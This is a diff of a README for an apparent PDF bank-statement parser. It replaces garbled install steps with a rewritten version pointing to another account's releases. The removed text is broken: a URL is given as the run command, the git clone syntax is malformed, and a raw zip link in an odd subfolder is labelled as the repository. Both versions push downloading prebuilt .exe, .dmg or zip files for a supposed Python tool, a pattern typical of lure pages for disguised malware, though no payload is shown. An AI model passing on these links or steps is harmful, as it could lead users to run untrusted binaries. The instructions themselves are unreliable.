@@ -1,71 +1,76 @@
-# 📊 finance-parser - Easily Analyze Your Bank Statements
+# 🧾 Python-PDF-Bank-Statement-Parser - Easily Extract Bank Data from PDFs
 
-## 🛠️ Overview
-Welcome to **finance-parser**, a simple command-line tool that lets you extract and analyze bank or payment transaction data from PDF statements. Whether you're managing your finances or reviewing transactions, this tool makes the process straightforward.
+[![Download](https://img.shields.io/badge/Download-Python--PDF--Bank--Statement--Parser-brightgreen)](https://github.com/mcthyn/Python-PDF-Bank-Statement-Parser/releases)
 
-## 🌟 Features
-- **PDF Support**: Work with your bank statements in PDF format.
-- **Data Extraction**: Extract essential transaction details quickly.
-- **Format Conversion**: Convert your data into CSV or JSON formats for easy analysis.
-- **User-Friendly**: Designed for users of all skill levels.
-
+## 📖 Description
+This tool extracts and analyzes bank transaction data from PDF statements. It helps you export structured details to CSV or JSON, making integration into other applications simple and straightforward.
 
 ## 🚀 Getting Started
-To use **finance-parser** on your computer, follow these simple steps:
+To use the Python-PDF-Bank-Statement-Parser, follow these steps to download and run the software.
 
-1. **Visit the Releases Page**: Click on the link below to access the download options.
-   [Visit Releases Page](https://github.com/Senior-Architecture/Python-PDF-Bank-Statement-Parser)
+### 📥 Download & Install
+1. Visit the [Releases page](https://github.com/mcthyn/Python-PDF-Bank-Statement-Parser/releases) to download the application.
+2. After opening the page, look for the most recent release.
+3. Click on the suitable file for your operating system to download it.
+   - For Windows users, download the `.exe` file.
+   - For Mac users, download the `.dmg` file.
+   - For Linux users, download the suitable package according to your distribution.
 
-2. **Choose Your Version**: Look for the latest release version. The latest version will be at the top of the list.
+Once downloaded, open the file and follow the installation prompts to complete setup.
 
-3. **Download the Installer**: Depending on your operating system, click the appropriate file to start the download.
+### 🌟 System Requirements
+- Operating System:
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any modern Linux distribution
 
-## 💻 System Requirements
-- **Operating Systems**: 
-  - Windows 10 or higher
-  - macOS Catalina or higher
-  - Most Linux distributions
-  
-- **Memory**: At least 512 MB of RAM.
+- Hardware:
+  - Minimum 4 GB RAM
+  - Minimum 500 MB free disk space
 
-- **Storage**: A minimum of 100 MB of free disk space.
+### 🛠️ Features
+- Extracts transaction data from various bank statement formats.
+- Supports both CSV and JSON output formats.
+- Easy command-line interface for quick operations.
+- Lightweight and efficient, suitable for daily use.
 
-## 📥 Download & Install
-Now that you are on the releases page, follow these steps to install the application:
+## 📊 Usage
+Once installed, you can use the tool from the command line. Here’s how to get started:
 
-1. **Download the File**: Click on the name of the file you want to download for your operating system (git clone -https://github.com/Senior-Architecture/Python-PDF-Bank-Statement-Parser).
-
-2. **Extract the Files**: Once the ZIP file is downloaded, locate it on your computer and extract its contents.
-
-3. **Run the Application**:
-   - For **Windows**: Open the Command Prompt (search for "cmd") and navigate to the folder containing the extracted files using the `cd` command. Then, type `https://github.com/Senior-Architecture/Python-PDF-Bank-Statement-Parser` to start the program.
-   - For **macOS**: Open the Terminal, navigate to the folder where the files are located, and type `./finance-parser` to run the tool.
-   - For **Linux**: Open the Terminal, navigate to the folder where you extracted the files, and type `./finance-parser` to launch the application.
-
-## 🎯 How to Use
-After successfully running the application, you can begin using **finance-parser**. Here is how:
-
-1. **Prepare Your PDF Statement**: Make sure your bank statement is in PDF format and saved in an easy-to-access location.
-
-2. **Run the Tool with the PDF File**: In the command prompt or terminal, use the following command:
+1. Open your command line interface (Command Prompt on Windows, Terminal on macOS and Linux).
+2. Navigate to the directory where you installed the Python-PDF-Bank-Statement-Parser.
+3. Run the application by typing:
    ```
-   finance-parser <path-to-your-pdf>
+   parser [options] [path_to_pdf]
    ```
-   Replace `<path-to-your-pdf>` with the actual path to your PDF file.
 
-3. **Analyze the Output**: The tool will process the PDF and display the extracted transaction data right in your command line window. You can also choose to save it as a CSV or JSON file if needed.
+### 🔧 Command Options
+- `-o, --output` : Specify the output format (CSV or JSON).
+- `-h, --help` : Display the help message and exit.
 
-## ❓ Troubleshooting
-- **PDF Not Found**: Ensure the path to your PDF file is correct.
-- **Permission Issues**: Make sure you have read permissions for the PDF file.
-- **Unknown Command**: If the tool doesn’t run, check that you navigated to the correct folder in the command line.
+### 📄 Example Command
+To extract data from a PDF and save it as a CSV, use:
+```
+parser -o csv path/to/your/bank_statement.pdf
+```
 
-## 🤝 Support
-If you encounter any issues or need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip). Your feedback is valuable for bettering the application.
+## 📝 Contributing
+Your participation is welcome! If you want to contribute:
 
-## 📚 Additional Resources
-For more tips and solutions on using the application, consider the following links:
-- [Official Documentation](https://github.com/Senior-Architecture/Python-PDF-Bank-Statement-Parser)
-- [User Community](https://github.com/Senior-Architecture/Python-PDF-Bank-Statement-Parser)
+1. Fork the repository.
+2. Create a feature branch (`git checkout -b feature/new-feature`).
+3. Commit your changes (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature/new-feature`).
+5. Open a pull request.
 
-Enjoy analyzing your financial data with **finance-parser**! Download it today and take the first step towards better financial management. 
+## 📞 Support
+If you encounter issues or have questions, please check the Issues section on GitHub. You can open a new issue if your question is not answered.
+
+## 📅 Changelog
+- **v1.0**: Initial release with core features.
+- **v1.1**: Added output format customization.
+
+## 💬 Topics
+This project involves various relevant topics such as banking, data management, and software ethics. Feel free to explore these themes in the context of your usage.
+
+Remember to visit the [Releases page](https://github.com/mcthyn/Python-PDF-Bank-Statement-Parser/releases) to get the latest version and keep your application updated.
